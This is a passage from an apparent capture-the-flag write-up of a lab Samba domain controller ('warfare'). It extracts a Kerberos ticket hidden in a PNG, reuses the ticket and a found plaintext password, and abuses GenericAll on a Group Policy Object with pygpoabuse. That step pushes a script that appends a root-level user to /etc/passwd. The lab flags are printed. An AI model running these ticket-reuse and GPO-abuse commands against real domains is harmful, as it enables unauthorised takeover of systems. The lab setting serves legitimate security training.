# Errors about function names...
└─$ for f in ../src/**/*.c; do sed -i '1i#define _GNU_SOURCE\n#define _XOPEN_SOURCE 700\n' "$f"; done
└─$ cmake ..
└─$ make install
[  9%] Building C object CMakeFiles/steg-png.dir/src/main.c.o
[ 18%] Building C object CMakeFiles/steg-png.dir/src/builtin/embed.c.o
[ 27%] Building C object CMakeFiles/steg-png.dir/src/builtin/extract.c.o
[ 36%] Building C object CMakeFiles/steg-png.dir/src/builtin/inspect.c.o
[ 45%] Building C object CMakeFiles/steg-png.dir/src/md5.c.o
[ 54%] Building C object CMakeFiles/steg-png.dir/src/parse-options.c.o
[ 63%] Building C object CMakeFiles/steg-png.dir/src/png-chunk-processor.c.o
[ 72%] Building C object CMakeFiles/steg-png.dir/src/str-array.c.o
[ 81%] Building C object CMakeFiles/steg-png.dir/src/strbuf.c.o
[ 90%] Building C object CMakeFiles/steg-png.dir/src/utils.c.o
[100%] Linking C executable steg-png
[100%] Built target steg-png
Install the project...
-- Install configuration: ""
-- Installing: /home/woyag/bin/steg-png

└─$ steg-png extract warfare.logo.png
└─$ file warfare.logo.png.out
warfare.logo.png.out: data

└─$ strings warfare.logo.png.out -n 10
WARFARE.LOCAL
WARFARE.LOCAL
X-CACHECONF:
krb5_ccache_conf_data
fast_avail
"krbtgt/WARFARE.LOCAL@WARFARE.LOCAL
WARFARE.LOCAL
X-CACHECONF:
krb5_ccache_conf_data
"krbtgt/WARFARE.LOCAL@WARFARE.LOCAL
WARFARE.LOCAL
...
```

## Kerberos

This is `robert`'s ticket
```bash
└─$ export KRB5CCNAME=warfare.logo.png.out
└─$ klist
Ticket cache: FILE:warfare.logo.png.out
Default principal: robert@WARFARE.LOCAL

Valid starting       Expires              Service principal
09/28/2025 02:02:39  09/28/2025 12:02:39  krbtgt/WARFARE.LOCAL@WARFARE.LOCAL
        renew until 09/29/2025 02:02:39
09/28/2025 02:02:39  09/28/2025 12:02:39  host/warfaredc.warfare.local@WARFARE.LOCAL
        renew until 09/29/2025 02:02:39
09/28/2025 02:02:39  09/28/2025 12:02:39  host/WARFAREDC@WARFARE.LOCAL
        renew until 09/29/2025 02:02:39
09/28/2025 02:02:39  09/28/2025 12:02:39  host/warfaredc@WARFARE.LOCAL
        renew until 09/29/2025 02:02:39
```

```bash
└─$ netexec smb warfare.local -u 'robert' --use-kcache --shares
SMB         warfare.local   445    WARFAREDC        [*] Unix - Samba x32 (name:WARFAREDC) (domain:warfare.local) (signing:True) (SMBv1:False)
SMB         warfare.local   445    WARFAREDC        [+] WARFARE.LOCAL\robert from ccache
SMB         warfare.local   445    WARFAREDC        [*] Enumerated shares
SMB         warfare.local   445    WARFAREDC        Share           Permissions     Remark
SMB         warfare.local   445    WARFAREDC        -----           -----------     ------
SMB         warfare.local   445    WARFAREDC        sysvol          READ
SMB         warfare.local   445    WARFAREDC        netlogon        READ
SMB         warfare.local   445    WARFAREDC        IPC$                            IPC Service (Samba 4.22.3-Debian-4.22.3+dfsg-4)
```

## SSH

We are able to SSH into the box
```bash
└─$ ssh -K robert@warfaredc.warfare.local
Linux warfaredc.warfare.local 6.12.38+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.38-1 (2025-07-16) x86_64

WARFARE\robert@warfaredc:~$ id
uid=10001(WARFARE\robert) gid=100(users) groups=100(users),3000009(BUILTIN\users)
```

### User.txt

```bash
WARFARE\robert@warfaredc:~$ cat user.txt
9e80f8f7698272b854e7d0480267b7e6
```

## Privilege Escalation

```bash
WARFARE\robert@warfaredc:~$ cat damn.txt

in case of anything, i note my password here.

.:.crossroadSBlues!
```

> Creds: `robert:.:.crossroadSBlues!`

Since we have credentials enumerate the DC with bloodhound
```bash
└─$ rusthound-ce --domain warfare.local -u robert -p '.:.crossroadSBlues!' -z -f warfaredc.warfare.local
```

![writeup-2.png](/assets/pentest/hackmyvm/warfare/writeup-2.png)

We have **GenericAll** on **Group Policy** -> [https://www.thehacker.recipes/ad/movement/group-policies](https://www.thehacker.recipes/ad/movement/group-policies)

Interestingly the [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) mentions this exact box, looking at commit dates it's been almost a week since this got merged from [[pyGPOAbuse_samba_ad_dc](https://github.com/crosscutsaw/pyGPOAbuse_samba_ad_dc)]([pyGPOAbuse_samba_ad_dc](https://github.com/crosscutsaw/pyGPOAbuse_samba_ad_dc))

![writeup-3.png](/assets/pentest/hackmyvm/warfare/writeup-3.png)

### GPO Abuse

We can also list all GPO objects with samba ad tools.
```bash
WARFARE\robert@warfaredc:~$ samba-tool gpo listall -U 'warfaredc/robert%.:.crossroadSBlues!'
GPO          : {31B2F340-016D-11D2-945F-00C04FB984F9}
display name : Default Domain Policy
path         : \\warfare.local\sysvol\warfare.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
dn           : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=warfare,DC=local
version      : 0
flags        : NONE

GPO          : {6AC1786C-016F-11D2-945F-00C04FB984F9}
display name : Default Domain Controllers Policy
path         : \\warfare.local\sysvol\warfare.local\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}
dn           : CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=warfare,DC=local
version      : 0
flags        : NONE

GPO          : {6BB6659D-BFAD-44B1-8B36-066C35CE2931}
display name : endpointsettings
path         : \\warfare.local\sysvol\warfare.local\Policies\{6BB6659D-BFAD-44B1-8B36-066C35CE2931}
dn           : CN={6BB6659D-BFAD-44B1-8B36-066C35CE2931},CN=Policies,CN=System,DC=warfare,DC=local
version      : 0
flags        : NONE
```

```bash
└─$ pygpoabuse 'warfare.local'/'robert':'.:.crossroadSBlues!' -dc-ip 192.168.56.109 -gpo-id '6BB6659D-BFAD-44B1-8B36-066C35CE2931' --linux-exec ./letmein.sh
[+] SUCCESS:root:executable 'letmein.sh' created in warfare.local\Policies\{6BB6659D-BFAD-44B1-8B36-066C35CE2931}\MACHINE\VGP\VTLA\Unix\Scripts\Startup
```

There's no [samba-gpupdate](https://manpages.ubuntu.com/manpages/jammy/man8/samba-gpupdate.8.html) utility, so we just wait some time.

Bash trick doesn't seem to work
```bash
WARFARE\robert@warfaredc:~$ ls -lh /tmp/rootbash
-rwsrwxrwx 1 root root 1.3M Sep 28 03:19 /tmp/rootbash
WARFARE\robert@warfaredc:~$ /tmp/rootbash -p
WARFARE\robert@warfaredc:~$ id
uid=10001(WARFARE\robert) gid=100(users) groups=100(users),3000009(BUILTIN\users)
```

```bash
└─$ pass=$(echo -n "letmein:$(openssl passwd -6 'Password123$'):0:0:letmein:/root:/bin/bash")
└─$ echo -e "#\!/bin/bash\necho '$pass' >> /etc/passwd" | tee letmein.sh
#!/bin/bash
echo 'letmein:$6$Kf5SBgPBj8E.eNe1$Joho2yq/rS4zKRY25eZGDff3u.hOS3LjChsXh0eegCUX42ihMQDxRD7NFF0KAWKqliyrwoi93nIrO1Zs/ct6G/:0:0:letmein:/root:/bin/bash' >> /etc/passwd
└─$ pygpoabuse 'warfare.local'/'robert':'.:.crossroadSBlues!' -dc-ip 192.168.56.109 -gpo-id '6BB6659D-BFAD-44B1-8B36-066C35CE2931' --linux-exec ./letmein.sh
[+] SUCCESS:root:executable 'letmein.sh' created in warfare.local\Policies\{6BB6659D-BFAD-44B1-8B36-066C35CE2931}\MACHINE\VGP\VTLA\Unix\Scripts\Startup
```

```bash
WARFARE\robert@warfaredc:~$ su - letmein
Password:
root@warfaredc:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@warfaredc:~# cat /root/root.txt

greetings from crossroads!
https://www.youtube.com/watch?v=7mJiDZz6wHs

802ecda85157bb5e02f815b97799bbd5
```

## P.S.

I was wrong about `gpupdate` not existing. It exists however only admins (`sbin`) can execute them.
```bash
root@warfaredc:~# cat gpupdate.sh
#!/bin/bash

samba-gpupdate
sleep 60
root@warfaredc:~# which samba-gpupdate
/usr/sbin/samba-gpupdate
```

Script that created stego tickets for some reason
```bash
root@warfaredc:~# cat ticketgenerator.sh
#!/bin/bash
set -euo pipefail
cd /root/ticketgen
export KRB5_CONFIG=/root/ticketgen/kvno-rc4.conf
export KRB5CCNAME=FILE:/root/ticketgen/robert.ccache
cat > /root/ticketgen/kvno-rc4.conf <<'EOC'
include /etc/krb5.conf
[libdefaults]
 default_realm = WARFARE.LOCAL
 default_tgs_enctypes = rc4-hmac
 default_tkt_enctypes = rc4-hmac
 permitted_enctypes   = rc4-hmac
 rdns = false
 dns_lookup_kdc = true
EOC
kdestroy -A || true
kinit -A -k -t ./robert.keytab robert@WARFARE.LOCAL
kvno host/warfaredc.warfare.local@WARFARE.LOCAL host/WARFAREDC@WARFARE.LOCAL host/warfaredc@WARFARE.LOCAL
klist -e -c "$KRB5CCNAME" | egrep -i 'krbtgt/|host/' || true
./steg-png embed -f ./robert.ccache -o logo.png ./baselogo.png
chown www-data:www-data logo.png
cp -f logo.png /var/www/html/assets/logo.png
kdestroy -A
sleep 60
```